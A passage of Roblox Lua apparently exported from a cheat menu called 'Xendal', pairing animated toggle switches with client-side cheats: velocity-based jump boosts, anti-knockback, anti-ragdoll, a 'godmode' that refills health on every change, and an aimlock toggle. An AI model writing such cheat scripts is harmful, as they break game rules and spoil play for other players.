			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_82);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Button.LocalScript
local function C_89()
local script = G2L["89"];
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	
	local player = Players.LocalPlayer
	
	-- CONFIG
	local jumpForce = 58
	local jumpBoostEnabled = false
	local SOUND_ID = ""
	
	local connections = {}
	local button = script.Parent
	if not button:IsA("TextButton") then button = nil end
	
	-- Limpieza de conexiones
	local function cleanupConnections()
		for _, c in ipairs(connections) do
			if c and c.Disconnect then
				pcall(function() c:Disconnect() end)
			end
		end
		connections = {}
	end
	
	-- Loop de salto
	local function applyJumpBoost(character)
		local hum = character:FindFirstChildWhichIsA("Humanoid")
		local rootPart = character:FindFirstChild("HumanoidRootPart")
		if not hum or not rootPart then return end
	
		local jumpedConn = hum.Jumping:Connect(function(active)
			if jumpBoostEnabled and active and rootPart then
				rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpForce, rootPart.Velocity.Z)
			end
		end)
		table.insert(connections, jumpedConn)
	end
	
	local function onCharacterAdded(character)
		cleanupConnections()
		character:WaitForChild("Humanoid")
		character:WaitForChild("HumanoidRootPart")
		applyJumpBoost(character)
	end
	
	player.CharacterAdded:Connect(onCharacterAdded)
	if player.Character and player.Character.Parent then
		onCharacterAdded(player.Character)
	end
	
	-- Sistema de sonido que no se corta
	local lastSound
	local function playSound()
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
		if not hrp then return end
	
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		lastSound = sound
		sound.Ended:Connect(function()
			if sound.Parent then sound:Destroy() end
		end)
	end
	
	-- Toggle salto
	local function toggleJumpBoost()
		jumpBoostEnabled = not jumpBoostEnabled
		playSound()
		if button then 
			button.TextColor3 = jumpBoostEnabled and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
		end
	end
	
	-- TextButton
	if button then
		button.MouseButton1Click:Connect(toggleJumpBoost)
		button.TextColor3 = jumpBoostEnabled and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
	end
	
end;
task.spawn(C_89);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Main Handler
local function C_8d()
local script = G2L["8d"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_8d);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Button.LocalScript
local function C_94()
local script = G2L["94"];
	local player = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")
	
	local button = script.Parent
	
	local antiKBEnabled = false
	local antiKnockbackConn = nil
	
	local lastSafeVelocity = Vector3.new(0, 0, 0)
	local VELOCITY_THRESHOLD = 35
	local UPDATE_INTERVAL = 0.016
	
	local function startNoKnockback()
		antiKBEnabled = true
	
		local char = player.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not (hrp and hum) then return end
	
		if antiKnockbackConn then
			antiKnockbackConn:Disconnect()
		end
	
		lastSafeVelocity = hrp.Velocity
		local lastCheck = tick()
		local lastPosition = hrp.Position
	
		antiKnockbackConn = RunService.Heartbeat:Connect(function()
			if not antiKBEnabled then return end
	
			local now = tick()
			if now - lastCheck < UPDATE_INTERVAL then return end
			lastCheck = now
	
			local currentVel = hrp.Velocity
			local currentPos = hrp.Position
			local positionChange = (currentPos - lastPosition).Magnitude
			lastPosition = currentPos
	
			local horizontalSpeed = Vector3.new(currentVel.X, 0, currentVel.Z).Magnitude
			local lastHorizontalSpeed = Vector3.new(lastSafeVelocity.X, 0, lastSafeVelocity.Z).Magnitude
	
			local isKnockback = false
	
			if horizontalSpeed > VELOCITY_THRESHOLD and horizontalSpeed > lastHorizontalSpeed * 4 then isKnockback = true end
			if math.abs(currentVel.Y) > 70 then isKnockback = true end
			if hum:GetState() == Enum.HumanoidStateType.Ragdoll or hum:GetState() == Enum.HumanoidStateType.FallingDown then isKnockback = true end
			if positionChange > 10 and horizontalSpeed > 50 then isKnockback = true end
	
			if isKnockback then
				if hum:GetState() == Enum.HumanoidStateType.Ragdoll or hum:GetState() == Enum.HumanoidStateType.FallingDown then
					hum:ChangeState(Enum.HumanoidStateType.GettingUp)
					task.wait(0.1)
				end
	
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Velocity = Vector3.new(0, 0, 0)
						part.RotVelocity = Vector3.new(0, 0, 0)
	
						for _, force in ipairs(part:GetChildren()) do
							if force:IsA("BodyVelocity") or force:IsA("BodyForce") or force:IsA("BodyAngularVelocity") or force:IsA("BodyGyro") then
								force:Destroy()
							end
						end
					end
				end
	
				hum.PlatformStand = false
				hum.AutoRotate = true
				lastSafeVelocity = Vector3.new(0, 0, 0)
	
			else
				local stable = hum:GetState() ~= Enum.HumanoidStateType.Freefall
					and hum:GetState() ~= Enum.HumanoidStateType.FallingDown
					and hum:GetState() ~= Enum.HumanoidStateType.Ragdoll
	
				if stable and horizontalSpeed < VELOCITY_THRESHOLD then
					lastSafeVelocity = currentVel
				end
			end
		end)
	end
	
	local function stopNoKnockback()
		antiKBEnabled = false
		if antiKnockbackConn then
			antiKnockbackConn:Disconnect()
			antiKnockbackConn = nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		-- 🔄 Toggle invertido
		if antiKBEnabled == false then
			startNoKnockback() 
		else
			stopNoKnockback()
		end
	end)
	
end;
task.spawn(C_94);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Main Handler
local function C_98()
local script = G2L["98"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
	
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		end
	end
	
	
	local Cooldown = false
	local isOpen = true   -- 🔥 INICIA ACTIVADO
	
	-- 🔥 Activa visualmente al inicio
	setToggle(true)
	
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
				isOpen = true
			else
				setToggle(false)
				isOpen = false
			end
	
			wait(0)
			Cooldown = false
		end
	end)
	
end;
task.spawn(C_98);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Button.LocalScript
local function C_9f()
local script = G2L["9f"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local humanoid = (player.Character or player.CharacterAdded:Wait()):WaitForChild("Humanoid")
	
	local button = script.Parent
	local isEnabled = true 
	local healthConn
	
	local OFF_COLOR = Color3.fromRGB(255,255,255)
	local ON_COLOR = Color3.fromRGB(70,130,180) 
	
	local function activate()
		healthConn = humanoid.HealthChanged:Connect(function()
			humanoid.Health = humanoid.MaxHealth
		end)
	end
	
	local function deactivate()
		if healthConn then
			healthConn:Disconnect()
			healthConn = nil
		end
	end
	
	local function toggle()
		if isEnabled then
			deactivate()
			button.TextColor3 = OFF_COLOR
		else
			activate()
			button.TextColor3 = ON_COLOR
		end
		isEnabled = not isEnabled
	end
	
	-- Estado inicial encendido
	activate()
	button.TextColor3 = ON_COLOR
	
	button.MouseButton1Click:Connect(toggle)
	
end;
task.spawn(C_9f);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Main Handler
local function C_a3()
local script = G2L["a3"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_a3);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Button.LocalScript
local function C_aa()
local script = G2L["aa"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local player = Players.LocalPlayer
	
	local AntiRagdollSettings = {
		Enabled = false,  -- Comienza apagado
		RagdollDuration = 5,
		AntiKnockback = true
	}
	
	local antiRagdollConnections = {}
	local humanoidWatchConnection = nil
	local lastPosition = nil
	local lastCFrame = nil
	local ragdollActive = false
	local ragdollTimer = nil
	
	local button = script.Parent  -- Asumimos que el botón está en el mismo script
	
	-- Función para obtener los componentes del personaje
	local function getCharacterComponents()
		local char = player.Character
		if not char then return nil, nil, nil end
	
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		local rootPart = char:FindFirstChild("HumanoidRootPart")
	
		return char, humanoid, rootPart
	end
	
	-- Detener el ragdoll
	local function stopRagdoll()
		if not ragdollActive then return end
	
		local char, humanoid, rootPart = getCharacterComponents()
		if not humanoid or not rootPart then return end
	
		ragdollActive = false
	
		humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		humanoid.PlatformStand = false
	
		rootPart.CanCollide = true
		if rootPart.Anchored then
			rootPart.Anchored = false
		end
	
		if char then
			for _, part in pairs(char:GetChildren()) do
				if part:IsA("BasePart") then
					for _, constraint in pairs(part:GetChildren()) do
						if constraint:IsA("BallSocketConstraint") or 
							constraint:IsA("HingeConstraint") then
							constraint:Destroy()
						end
					end
	
					local motor = part:FindFirstChildWhichIsA("Motor6D")
					if motor then
						motor.Enabled = true
					end
				end
			end
		end
	
		pcall(function()
			local controlModule = require(player.PlayerScripts.PlayerModule.ControlModule)
			if controlModule and controlModule.Enable then
				controlModule:Enable()
			end
		end)
	
		rootPart.Velocity = Vector3.new(0, math.min(rootPart.Velocity.Y, 0), 0)
		rootPart.RotVelocity = Vector3.new(0, 0, 0)
	
		workspace.CurrentCamera.CameraSubject = humanoid
	end
	
	-- Función para iniciar el temporizador del ragdoll
	local function startRagdollTimer(char)
		if not AntiRagdollSettings.Enabled or ragdollActive then return end
	
		if ragdollTimer then
			ragdollTimer:Disconnect()
			ragdollTimer = nil
		end
	
		ragdollActive = true
	
		ragdollTimer = game:GetService("RunService").Heartbeat:Connect(function()
			ragdollTimer:Disconnect()
			ragdollTimer = nil
			stopRagdoll()
		end)
	end
	
	-- Función para observar los cambios de estado del humanoide
	local function watchHumanoidStates(char)
		local humanoid = char:WaitForChild("Humanoid")
	
		if humanoidWatchConnection then
			humanoidWatchConnection:Disconnect()
		end
	
		humanoidWatchConnection = humanoid.StateChanged:Connect(function(_, newState)
			if AntiRagdollSettings.Enabled then
				if newState == Enum.HumanoidStateType.FallingDown or
					newState == Enum.HumanoidStateType.Ragdoll or
					newState == Enum.HumanoidStateType.Physics then
	
					if not ragdollActive then
						humanoid.PlatformStand = true
						startRagdollTimer(char)
					end
	
				elseif newState == Enum.HumanoidStateType.GettingUp or
					newState == Enum.HumanoidStateType.Running or
					newState == Enum.HumanoidStateType.RunningNoPhysics then
	
					humanoid.PlatformStand = false
					if ragdollActive then
						stopRagdoll()
					end
				end
			end
		end)
	
		table.insert(antiRagdollConnections, humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
			if AntiRagdollSettings.Enabled then
				if not ragdollActive and humanoid.PlatformStand then
					humanoid.PlatformStand = false
				end
			end
		end))
	
		table.insert(antiRagdollConnections, RunService.Heartbeat:Connect(function()
			if not AntiRagdollSettings.Enabled then return end
	
			local char, humanoid, rootPart = getCharacterComponents()
			if char and rootPart then
				local currentCFrame = rootPart.CFrame
				local currentPosition = rootPart.Position
	
				if ragdollActive and AntiRagdollSettings.AntiKnockback then
					if lastPosition then
						local positionDifference = (currentPosition - lastPosition).Magnitude
						local velocityMagnitude = rootPart.Velocity.Magnitude
	
						if positionDifference > 8 and velocityMagnitude > 25 then
							rootPart.Velocity = rootPart.Velocity * 0.7
							rootPart.RotVelocity = rootPart.RotVelocity * 0.7
						end
					end
					lastPosition = currentPosition
					lastCFrame = currentCFrame
				else
					lastPosition = currentPosition
					lastCFrame = currentCFrame
				end
	
				if not ragdollActive and humanoid then
					local currentState = humanoid:GetState()
					if currentState == Enum.HumanoidStateType.Physics or 
						currentState == Enum.HumanoidStateType.Ragdoll then
						humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
						humanoid.PlatformStand = false
					end
				end
			end
		end))
	end
	
	-- Función para configurar el personaje
	local function setupCharacter(char)
		ragdollActive = false
		if ragdollTimer then
			ragdollTimer:Disconnect()
			ragdollTimer = nil
		end
	
		char:WaitForChild("Humanoid")
		char:WaitForChild("HumanoidRootPart")
	
		watchHumanoidStates(char)
	
		table.insert(antiRagdollConnections, char.ChildAdded:Connect(function(child)
			if child:IsA("BasePart") then
				table.insert(antiRagdollConnections, child.ChildAdded:Connect(function(constraint)
					if not ragdollActive and (constraint:IsA("BallSocketConstraint") or 
						constraint:IsA("HingeConstraint")) then
						constraint:Destroy()
					end
				end))
			end
		end))
	end
	
	-- Función para activar el AntiRagdoll
	local function enableAntiRagdoll()
		AntiRagdollSettings.Enabled = true
	
		for _, connection in pairs(antiRagdollConnections) do
			if connection and connection.Connected then
				connection:Disconnect()
			end
		end
		table.clear(antiRagdollConnections)
	
		if humanoidWatchConnection then
			humanoidWatchConnection:Disconnect()
			humanoidWatchConnection = nil
		end
	
		if player.Character then
			setupCharacter(player.Character)
		end
	
		table.insert(antiRagdollConnections, player.CharacterAdded:Connect(function(char)
			setupCharacter(char)
		end))
	end
	
	-- Función para desactivar el AntiRagdoll
	local function disableAntiRagdoll()
		AntiRagdollSettings.Enabled = false
		ragdollActive = false
	
		if ragdollTimer then
			ragdollTimer:Disconnect()
			ragdollTimer = nil
		end
	
		for _, connection in pairs(antiRagdollConnections) do
			if connection and connection.Connected then
				connection:Disconnect()
			end
		end
		table.clear(antiRagdollConnections)
	
		if humanoidWatchConnection then
			humanoidWatchConnection:Disconnect()
			humanoidWatchConnection = nil
		end
	end
	
	-- Control del botón
	button.MouseButton1Click:Connect(function()
		AntiRagdollSettings.Enabled = not AntiRagdollSettings.Enabled
		if AntiRagdollSettings.Enabled then
			enableAntiRagdoll()
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Color al activar (azul)
		else
			disableAntiRagdoll()
			button.TextColor3 = Color3.fromRGB(255,255,255)  -- Color al desactivar (blanco)
		end
	end)
	
	-- Inicializa con el AntiRagdoll apagado
	button.TextColor3 = Color3.fromRGB(255,255,255)  -- Color inicial (blanco)
	disableAntiRagdoll()
	
	Players.PlayerRemoving:Connect(function(p)
		if p == player then
			disableAntiRagdoll()
		end
	end)
	
	return {
		Enable = enableAntiRagdoll,
		Disable = disableAntiRagdoll,
		Toggle = function()
			AntiRagdollSettings.Enabled = not AntiRagdollSettings.Enabled
			if AntiRagdollSettings.Enabled then
				enableAntiRagdoll()
			else
				disableAntiRagdoll()
			end
			return AntiRagdollSettings.Enabled
		end,
		SetRagdollDuration = function(seconds)
			AntiRagdollSettings.RagdollDuration = math.max(0.5, seconds)
		end,
		SetAntiKnockback = function(enabled)
			AntiRagdollSettings.AntiKnockback = enabled
		end
	}
	
end;
task.spawn(C_aa);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Main Handler
local function C_ae()
local script = G2L["ae"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_ae);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
local function C_b5()
local script = G2L["b5"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalInstaGrab") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_b5);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Main Handler
local function C_b9()
local script = G2L["b9"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_b9);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Button.LocalScript
local function C_c0()
local script = G2L["c0"];
	local player = game:GetService("Players").LocalPlayer
	local UserInputService = game:GetService("UserInputService")
	
	local highJumpEnabled = false      -- Estado inicial del toggle
	local JUMP_FORCE = 85              -- Fuerza del salto
	
	-- Comprueba si tienes el item "Coil Combo"
	local function hasCoilCombo()
		if player.Character and player.Character:FindFirstChild("Coil Combo") then
			return true
		end
		if player.Backpack:FindFirstChild("Coil Combo") then
			return true
		end
		return false
	end
	
	-- High Jump al presionar Space
	UserInputService.InputBegan:Connect(function(input, gp)
		if gp then return end
		if input.KeyCode ~= Enum.KeyCode.Space then return end
		if not highJumpEnabled then return end
	
		local char = player.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChildOfClass("Humanoid")
	
		if hum and hrp then
			task.defer(function()
				game:GetService("RunService").Heartbeat:Wait()
				hrp.Velocity = Vector3.new(hrp.Velocity.X, JUMP_FORCE, hrp.Velocity.Z)
			end)
		end
	end)
	
	-- Toggle con tu TextButton
	local highJumpButton = script.Parent   -- Tu TextButton
	
	highJumpButton.MouseButton1Click:Connect(function()
		highJumpEnabled = not highJumpEnabled
	
		highJumpButton.Text = highJumpEnabled and "" or ""
		highJumpButton.BackgroundColor3 = highJumpEnabled
			and Color3.fromRGB(0,255,0)
			or Color3.fromRGB(200,200,200)
	end)
	
end;
task.spawn(C_c0);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Main Handler
local function C_c4()
local script = G2L["c4"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_c4);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
local function C_cb()
local script = G2L["cb"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("ScreenGui") -- Especifica el ScreenGui
